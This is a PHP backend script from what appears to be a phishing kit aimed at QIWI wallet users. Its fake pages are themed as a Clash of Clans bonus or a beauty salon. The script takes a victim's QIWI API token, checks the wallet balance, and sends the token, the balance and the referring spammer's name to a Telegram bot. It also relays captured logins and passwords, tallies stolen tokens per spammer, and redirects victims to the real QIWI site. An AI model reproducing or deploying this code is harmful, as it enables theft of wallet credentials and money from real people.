<?PHP
session_start();
$off = file_get_contents("http://easybonus.xyz/enable.txt");
if($off == "false"){
    exit;
}
require_once ("QiwiApi.php");
$db = mysqli_connect("localhost", "", "", "");
	$token = $_POST['token'];
	$ref = $_SESSION['ref'];
	$phone = "";
	
		
	$tokeny = "" ;
	$chat_id = "-237444129"; // %2F
	$spam_id = "-297679794";

	if($token == null && $phone == null){
		return;
	}
	if(preg_match("/\bZAP\b/i", $name." ".$pass." ".$token." ".$number) == true){
			return;
		}

	$number = curl(false, [], $token)['personId'];
    $qiwi = new QiwiApi($number, $token);
    $balance = $qiwi->getBalance()[0]['balance']['amount'];
    $status = "Статус: valid token";
    if($balance == null){
            $status = "Статус: invalid token";
            //return "Неверный API Token";
    }
    $name = "Clash of clans";
    if(isset($_POST['name'])){
        $name = "Салон красоты";
    }
	if($phone != null) {
		$txt = urlencode("Авторизация пользователя\nЛогин: $phone \nПароль: $pass");
		$sendToTelegram = fopen("https://api.telegram.org/bot{$tokeny}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
		echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://qiwi.com/'></head></html>";
	} else {

        if($status == "Статус: invalid token") {
            //return;
        }
        if($ref !== null){
            $resone = mysqli_fetch_array(mysqli_query($db, "SELECT * FROM spamers WHERE `spamer`='$ref'"));
            $bal = $resone['balance'] + $balance;
            $tok = $resone['tokens'] + 1;
            mysqli_query($db, "UPDATE spamers SET `balance` = '+".$bal."', `tokens` = '$tok' WHERE `spamer`='$ref'");
        }
	$txt = urlencode("Фейк: $name \nСпонсор этого токена\nБаланс QIWI: $balance руб \nТокен: $token \n$status\nПригласивший спаммер: $ref");
	$txtt = urlencode("Фейк: $name \nПришел новый токен\nБаланс QIWI: $balance руб \n$status\nПригласивший спаммер: $ref \n\nСоздать свою ссылку для спама: http://easybonus.xyz/clash/send.php?ref=никТГ");

	$sendToTelegram = fopen("https://api.telegram.org/bot{$tokeny}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
	if($ref !== "" && $ref !== null){
		$sendToTelegram2 = fopen("https://api.telegram.org/bot{$tokeny}/sendMessage?chat_id={$spam_id}&parse_mode=html&text={$txtt}","r");
	}

	echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://qiwi.com/'></head></html>";
	}
	function curl($post = false, array $content = [], $token) {
        $url   = 'https://edge.qiwi.com/person-profile/v1/profile/current';
        $ch = curl_init();
        if ($post) {
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($content));
        } else {
            curl_setopt($ch, CURLOPT_URL, $url.'/?' . http_build_query($content));
        }
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Accept: application/json',
            'Content-Type: application/json',
            'Authorization: Bearer ' . $token
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result = curl_exec($ch);
        curl_close($ch);
        return json_decode($result, 1);
    }
?>